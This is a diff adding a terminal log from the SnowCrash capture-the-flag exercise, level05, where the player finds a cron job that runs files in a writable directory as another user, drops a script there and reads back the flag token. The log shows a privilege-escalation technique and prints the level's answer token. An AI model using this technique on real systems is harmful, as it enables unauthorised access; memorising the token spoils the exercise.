@@ -1,0 +1,28 @@
+level05@SnowCrash:~$ ll /var/mail
+total 4
+drwxrwsr-x  1 root mail  60 Mar  5  2016 ./
+drwxr-xr-x  1 root root 160 Mar 12  2016 ../
+-rw-r--r--+ 1 root mail  58 Jun  5 19:31 level05
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+level05@SnowCrash:~$ cd /opt/openarenaserver/
+level05@SnowCrash:/opt/openarenaserver$ ll
+total 0
+drwxrwxr-x+ 2 root root 40 Jun  5 19:31 ./
+drwxr-xr-x  1 root root 60 Jun  5 19:31 ../
+
+level05@SnowCrash:/opt/openarenaserver$ nano script.sh
+level05@SnowCrash:/opt/openarenaserver$ chmod 777 script.sh
+level05@SnowCrash:/opt/openarenaserver$ l
+script.sh*
+
+level05@SnowCrash:/opt/openarenaserver$ cat /tmp/output.txt
+Check flag.Here is your token : viuaaale9huek52boumoomioc
